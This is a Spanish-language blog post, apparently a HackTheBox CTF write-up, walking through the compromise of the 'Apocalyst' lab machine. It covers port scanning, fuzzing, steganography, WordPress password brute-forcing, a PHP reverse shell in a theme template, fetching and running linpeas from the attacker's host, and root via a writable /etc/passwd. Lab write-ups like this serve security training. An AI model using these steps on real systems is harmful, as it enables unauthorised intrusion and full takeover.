---
layout: post
title: "Apocalyst Writeup HackTheBox"
date: 2022-02-22
excerpt: "Les traigo el writeup de una máquina de tipo CTF, la cuál tiene una intrusión bastante única y siendo de dificultad media es bastante accesible para los que están empezando en el mundo del pentesting"
tags: [fuzzing, pentesting, web, cryptography, privesc]
feature: 'https://th4nuno.github.io/assets/img/posts/apocalyst.png'
comments: true
---

# Reconocimiento

Comenzamos con esta etapa usando una herramienta de escaneo de puertos muy conocida llamada *nmap*. Primero haremos un escaneo simple para encontrar los puertos abiertos y luego buscaremos más detalle en los encontrados.

{% highlight bash %}
nmap -p- --open -v -T5 -sS -n -Pn 10.10.10.46 -oG allPorts
{% endhighlight %}

Para realizar un escaneo del rango completo de puertos por TCP (0-65535) y mostrar solamente los abiertos usamos los parámetros *-p-* y *--open*. También agregamos *-v* para irnos mostrando la información que nmap encuentre. Ahora, este escaneo puede llevar mucho tiempo. Para más rapidez, como estamos en un ambiente controlado en el que podemos hacer pruebas sin ningun tipo de problema, vamos a utilizar el nivel mas rápido que trae esta herramienta, especificando el parámetro *-T5*, además de simplicar el escaneo con un SYN scan (*-sS*), sin resolución DNS (*-n*) y sin host discovery (*-Pn*). Tambien lo voy a exportar en formato grepeable para obtener los puertos de una forma rápida con [extractPorts](https://pastebin.com/tYpwpauW), una función en bash que tengo añadida a mi terminal.

{% highlight bash %}
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 11:56 -03
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.46 [65535 ports]
Discovered open port 80/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
SYN Stealth Scan Timing: About 37.29% done; ETC: 11:57 (0:00:52 remaining)
Completed SYN Stealth Scan at 11:57, 73.13s elapsed (65535 total ports)
Nmap scan report for 10.10.10.46
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 73.24 seconds
           Raw packets sent: 69344 (3.051MB) | Rcvd: 69344 (2.774MB)
{% endhighlight %}

Nmap nos muestra que los únicos puertos que están abiertos son el 22 (SSH) y el 80 (HTTP). Ahora vamos a tomar estos puertos y realizar un escaneo para intentar obtener sus versiones y enumerar los servicios con los scripts de nmap (*-sCV*)

{% highlight bash %}
nmap -sCV -p 22,80 10.10.10.46 -oN targeted
{% endhighlight %}

{% highlight bash %}
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 13:36 -03
Nmap scan report for 10.10.10.46
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds
{% endhighlight %}

### Wordpress

Ahora que tenemos mas información, sabemos especificamente sus versiones y además, con el script de nmap *http-generator* vemos que el sitio web tiene de CMS un Wordpress. Esto lo podemos confirmar con whatweb:

{% highlight bash %}
whatweb 10.10.10.46
{% endhighlight %}

{% highlight bash %}
http://10.10.10.46 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
{% endhighlight %}

Como es un Wordpress usando **wpscan**, que es una herramienta que podés encontrar [acá](https://github.com/wpscanteam/wpscan), podemos escanear el sitio web en busca de algun fallo del que nos podramos aprovechar. En este caso no es de utilidad, asi que seguimos buscando. 

Si miramos la página web a través de la ip se ve bastante mal. Esto lo podemos solucionar agregando el dominio, colocando la siguiente línea en nuestro */etc/hosts*:

{% highlight bash %}
10.10.10.46 apocalyst.htb
{% endhighlight %}

Utilizando el script *http-enum* de nmap podemos hacer fuzzing con un diccionario muy simple que trae la misma, el cual nos arroja algunos resultados:

{% highlight bash %}
nmap --script=http-enum -p 80 10.10.10.46 -oN webScan
{% endhighlight %}

{% highlight bash %}
Nmap scan report for 10.10.10.46
  Host is up (0.15s latency).
  
  PORT   STATE SERVICE
  80/tcp open  http
  | http-enum:
  |   /blog/: Blog
  |   /wp-login.php: Possible admin folder
  |   /readme.html: Wordpress version: 2
  |   /: WordPress version: 4.8
  |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
  |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
  |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
  |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
  |   /wp-login.php: Wordpress login page.
  |   /wp-admin/upgrade.php: Wordpress login page.
  |   /readme.html: Interesting, a readme.
  |   /custom/: Potentially interesting folder
  |   /down/: Potentially interesting folder
  |   /good/: Potentially interesting folder
  |   /hidden/: Potentially interesting folder
  |   /idea/: Potentially interesting folder
  |   /info/: Potentially interesting folder
  |   /information/: Potentially interesting folder
  |   /name/: Potentially interesting folder
  |   /page/: Potentially interesting folder
  |   /personal/: Potentially interesting folder
  |   /pictures/: Potentially interesting folder
  |   /site/: Potentially interesting folder
  |  /state/: Potentially interesting folder
  
  # Nmap done at Wed Feb 23 09:19:46 2022 -- 1 IP address (1 host up) scanned in 15.31 seconds
{% endhighlight %}

Sin contar las páginas de Wordpress por defecto, la mayoría nos resuelven el mismo resultado: una simple imagen.

![apocalyst1](https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst1.png)

Esto ya parece un poco raro, vamos a seguir viendo a ver que encontramos. 

### Fuzzing

Haciendo fuzzing con la herramienta WFuzz (si no la conocés tengo un articulo [acá](https://th4nuno.github.io/Aprende-a-Usar-Wfuzz) en el que te enseño cómo utilizarla) encontramos el mismo resultado reiteradas veces, la misma imagen con la misma cantidad de carácteres, lo que significa que son idénticas. Como la página web es un blog con varios artículos, vamos a hacer uso de Cewl (que viene instalada por defecto en Parrot y Kali Linux), la cuál nos permitirá crear nuestro propio diccionario en base a la url que especifiquemos: 

{% highlight bash %}
cewl -w wordlist.txt "http://apocalyst.htb/"
{% endhighlight %}

Con este comando ya habríamos creado el archivo *wordlist.txt* así que vamos a incorporarlo a WFuzz, ocultando los resultados que nos arrojen 157 carácteres que devuelven la imagen repetida:

{% highlight bash %}
wfuzz -c --hc=404 --hh=157 -t 200 -L -u "http://apocalyst.htb/FUZZ" -w ../content/wordlist.txt
{% endhighlight %}

{% highlight bash %}
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ
Total requests: 532

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000455:   200        14 L     20 W       175 Ch      "Rightiousness"                                                                                                             

Total time: 0
Processed Requests: 532
Filtered Requests: 531
Requests/sec.: 0
{% endhighlight %}

Como ven encontramos solo una página, pero lo que más nos llama la atención es que nos muestra la misma imagen que vimos anteriormente, pero con una cantidad de carácteres diferente. Esto significa que seguramente estamos ante una técnica de **esteganografía**.

## Esteganografía en Imágenes

Esta técnica de criptografía muy conocida nos permite ocultar información dentro de una imagen, pero sin que se vea a simple vista. Esto es lo que nos está pasando seguramente. Todas las imágenes son iguales menos una, que tiene un tamaño diferente (por eso nos devuelve otra cantidad diferente de carácteres). Para analizarla y comprobar si hay un archivo oculto dentro, vamos a utilizar un herramienta llamada **steghide**. Descargamos la imagen y utilizamos el siguiente comando.

{% highlight bash %}
steghide info image.jpg
{% endhighlight %}

{% highlight bash %}
"image.jpg":
  format: jpeg
  capacity: 13.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "list.txt":
    size: 3.6 KB
    encrypted: rijndael-128, cbc
    compressed: yes
{% endhighlight %}

Al ejecutarlo nos pide una contraseña, pero si probamos dejándolo en blanco funciona. Nos muestra que hay un archivo list.txt contenido dentro de la imagen, el cual podemos extraer:

{% highlight bash %}
steghide extract -sf image.jpg
{% endhighlight %}

El archivo que obtenemos no es más que una simple lista de palabras, pero que podemos utilizar para intentar hacer un bruteforcing.

### Bruteforcing

Para esto tenemos que obtener un usuario válido. Esto es muy fácil, ya que si observamos cualquier artículo del sitio web como es un Wordpress nos muestra el usuario que lo creó. Este usuario se llama "falaraki". Podemos comprobar que es un usuario válido visitando *wp-login.php*, colocando un usuario erróneo obtenemos:

![apocalyst2](https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst2.png)

Claramente nos dice que lo que está mal es el usuario. Ahora, vamos a ver qué nos muestra si probamos con falaraki:

![apocalyst3](https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst3.png)

Ahora nos dice otra cosa diferente. Esto es porque Wordpress por defecto diferencia el error de un usuario inválido al de un usuario válido con una contraseña incorrecta. Por lo tanto, vamos a probar de vuelta con **wpscan** pero ahora realizando un bruteforcing. Para eso vamos a utilizar el siguiente comando, habiendo guardado el usuario dentro de un archivo "user" en el mismo directorio que nuestra lista de contraseñas:

{% highlight bash %}
wpscan --url http://apocalyst.htb/ -U user -P list.txt
{% endhighlight %}

{% highlight bash %}
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - falaraki / Transclisiation                                                                                                                                                       
Trying falaraki / total Time: 00:00:21 <=============================================                                                                     > (335 / 821) 40.80%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation
{% endhighlight %}

Excelente! Conseguimos credenciales válidas, ahora toca la parte mas fácil, que es obtener acceso a la máquina.

### Explotando el Panel de Wordpress

![apocalyst4](https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst4.png)

Ahora que estamos dentro del panel de Wordpress, vamos a dirigirnos a *Appeareance->Editor*

![apocalyst5](https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst5.png)

Dentro del editor, vamos a abrir el template *404.php* que se encuentra a la derecha. Esto nos permite modificar el código PHP del mismo, por lo tanto simplemente añadimos una reverse shell en PHP y guardamos el archivo. Solo falta ponernos en escucha con **netcat** e irnos a un artículo que no exista. Para ponernos en escucha por el puerto 443 ejecutamos el siguiente comando:

{% highlight bash %}
nc -nvlp 443
{% endhighlight %}

Como podemos listar los artículos con *?p=x* vamos a cambiarlo a un número que no exista, como por ejemplo *?p=10* y obtenemos inmediatamente la shell.

{% highlight bash %}
www-data@apocalyst:/var/www/html/apocalyst.htb$ whoami
whoami
www-data
{% endhighlight %}

#### Tratamiento de la TTY

La shell que tenemos realmente no es tan cómoda, así que para solucionarlo podemos realizar una serie de pasos que siempre son los mismos en una máquina Linux, para poder obtener una shell completamente funcional. 

{% highlight bash %}
script /dev/null -c bash
(Ctrl-Z)
stty raw -echo; fg
	reset xterm
export TERM=xterm
export SHELL=bash
{% endhighlight %}

Listo. Ahora podemos hacer Ctrl-C sin peligro de que se nos cierre la bash y Ctrl-L para limpiar la terminal.

Si nos dirigimos a /home/falaraki encontramos el user.txt con la flag. Ahora toca escalar privilegios.

## Escalación de Privilegios

Vamos a descargar en la máquina [**linPEAS**](https://github.com/carlospolop/PEASS-ng), una utilidad que nos permitirá realizar una gran cantidad de escaneos para encontrar fallas en el sistema. Para traerla decidí crear en mi máquina un servidor en Python en el mismo directorio que tengo el script y descargar el archivo en la shell. 

{% highlight bash %}
(En mi máquina)
python3 -m http.server 80

(En la máquina víctima)
cd /dev/shm
wget http://10.10.14.7/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
{% endhighlight %}

Como el escaneo devuelve demasiada información voy a colocar sólo un fragmento que me llamó mucho la atención:

{% highlight bash %}
╔══════════╣ Permissions in init, init.d, systemd, and rc.d   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
═╣ Writable passwd file? ................ /etc/passwd is writable
{% endhighlight %}

Esto muy pocas veces lo van a ver, pero cuando lo vean ya tienen asegurado el root. Como tenemos permisos para escribir en el passwd podemos acceder como el usuario que queramos. Lo pueden comprobar haciendo un *ls*:

{% highlight bash %}
ls -la /etc/passwd
-rw-rw-rw- 1 root root 1649 Feb 24 12:25 /etc/passwd
{% endhighlight %}

Por defecto los usuarios tienen una x, lo que significa que la contraseña la tomará del /etc/shadow, archivo el cuál no tenemos acceso. Por lo tanto, necesitamos cambiar esa x por un hash, porque el sistema tomará la primera contraseña que encuentre, que será la añadida.

{% highlight bash %}
> openssl passwd
Password: toor
Verifying - Password: toor
2r5/v3qyIr5jI
{% endhighlight %}

Cambiamos la x de root en el /etc/passwd por este hash y listo:

{% highlight bash %}
www-data@apocalyst:/dev/shm$ su root
Password: 
root@apocalyst:/dev/shm# whoami 
root
root@apocalyst:/dev/shm# 
{% endhighlight %}
